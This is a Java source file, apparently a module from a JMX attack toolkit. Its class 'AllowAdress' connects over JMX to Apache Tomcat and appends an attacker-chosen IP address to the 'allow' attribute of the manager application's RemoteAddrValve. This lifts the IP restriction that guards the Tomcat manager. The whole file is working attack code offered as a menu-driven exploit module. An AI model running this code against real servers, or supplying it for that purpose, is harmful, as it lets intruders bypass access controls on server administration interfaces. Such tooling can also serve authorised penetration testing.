package jmxattacks;

import javax.management.Attribute;
import javax.management.ObjectName;

import jmxmenus.MainMenu;
import jmxutils.EasyBasicParser;
import org.apache.commons.cli.CommandLine;
import org.apache.commons.cli.OptionBuilder;
import org.apache.commons.cli.Options;
import org.apache.commons.cli.ParseException;
import org.apache.commons.cli.Parser;

public class AllowAdress extends Attack{
	String banner = "Please enter options for this module or back to return to the main menu";
	String example = "--ip ip_to_allow ";
	String description = "This attack will remove the ip adress limitation on manager";
	String name = "AllowAdress";
	private String ip;
	private String temp_ip;
	private ObjectName object ;
	private String mbean = "Catalina:type=Valve,context=/manager,host=localhost,name=RemoteAddrValve";
	
	public AllowAdress() {
	
		this.setAttack_description(description);
		this.setAttack_name(name);
	}
	
	public void prepareExploit(String arg)
	{
		this.setAttack_description(description);
		this.setAttack_name(name);	
		Parser parser = new EasyBasicParser();
		CommandLine line = null;
		try {
			line = parser.parse( this.setArgs(), StringtoArrayList(arg));
		} catch (ParseException e) {
			System.err.println( "Parsing failed.  Reason: " + e.getMessage() );
			System.exit(-1);
		}
				
		if (line != null)
		{
		    this.ip = line.getOptionValue("ip");
		   	this.object = createObject(this.mbean);
		    this.exploit();
			try {
				Thread.sleep(2000);
			} catch (InterruptedException e) {
				System.out.println(e.getMessage());	
			}
		}
	}
	
	public void prepareExploit() {
		
		System.out.println(this.name+" exploit selected");
			// Display Menu to retrieve options
			CommandLine line = attackMenu(this.setArgs(),this.banner,this.example);
			
			if (line != null)
			{
			   	this.ip = line.getOptionValue("ip");
			   
			   	this.object = createObject(this.mbean);
			   	System.out.println("#### the ip will be change ####");
			    this.exploit();
				try {
					Thread.sleep(2000);
				} catch (InterruptedException e) {
					System.out.println(e.getMessage());	
				}	
			}
			System.out.println("#### Your ip should be allowed ####\n");
			MainMenu menu = new MainMenu();
		
	}

	
	private Options setArgs()
	{
		Options options = new Options();
		options.addOption("h", "help", true, "prints the help content");
		   options.addOption(OptionBuilder
			       .withArgName("ip")
			       .withLongOpt("ip")
			       .hasArg()
			       .isRequired()
			       .withDescription("ip to allow")
			       .create());
		   
		   return options;
	}
	
	public void exploit()
	{
		// Get previous limitation
		Object retour;
        retour=getAttribute(this.object,"allow");
        this.temp_ip=retour.toString();
        setAttribute(this.object,new Attribute("allow",this.temp_ip+"|"+this.ip));
		System.out.println("IP should be allowed");
				
	}
	
	

}
